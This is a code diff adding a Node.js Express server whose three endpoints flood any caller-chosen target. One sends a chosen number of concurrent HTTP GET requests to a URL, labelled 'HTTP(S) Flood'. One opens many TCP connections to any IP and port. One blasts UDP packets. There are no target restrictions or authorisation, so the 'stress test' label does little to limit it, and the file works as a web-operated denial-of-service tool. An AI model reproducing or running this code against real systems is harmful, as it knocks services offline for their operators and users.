@@ -1,0 +1,57 @@
+const express = require('express');
+const axios = require('axios');
+const net = require('net');
+const dgram = require('dgram');
+const app = express();
+
+app.use(express.json());
+app.use(express.static('public'));
+
+// --- Endpoint HTTP(S) Flood ---
+app.post('/api/http', async (req, res) => {
+    const { url, count } = req.body;
+    let success = 0; let fail = 0;
+
+    const requests = Array.from({ length: parseInt(count) }).map(async () => {
+        try {
+            await axios.get(url, { timeout: 2000 });
+            success++;
+        } catch (err) {
+            fail++;
+        }
+    });
+
+    await Promise.allSettled(requests);
+    res.json({ protocol: 'HTTPS', success, fail });
+});
+
+// --- Endpoint TCP (Connection Stress) ---
+app.post('/api/tcp', (req, res) => {
+    const { ip, port, count } = req.body;
+    let connected = 0;
+
+    for (let i = 0; i < count; i++) {
+        const client = new net.Socket();
+        client.connect(port, ip, () => {
+            connected++;
+            client.destroy();
+        });
+        client.on('error', () => { /* Ignore errors */ });
+    }
+    setTimeout(() => res.json({ protocol: 'TCP', connected }), 2000);
+});
+
+// --- Endpoint UDP (Packet Flood) ---
+app.post('/api/udp', (req, res) => {
+    const { ip, port, count } = req.body;
+    const client = dgram.createSocket('udp4');
+    const message = Buffer.from('Stress Test Packet');
+
+    for (let i = 0; i < count; i++) {
+        client.send(message, port, ip);
+    }
+    res.json({ protocol: 'UDP', packets_sent: count });
+});
+
+app.listen(3000, () => console.log('Server running on http://localhost:3000'));
+
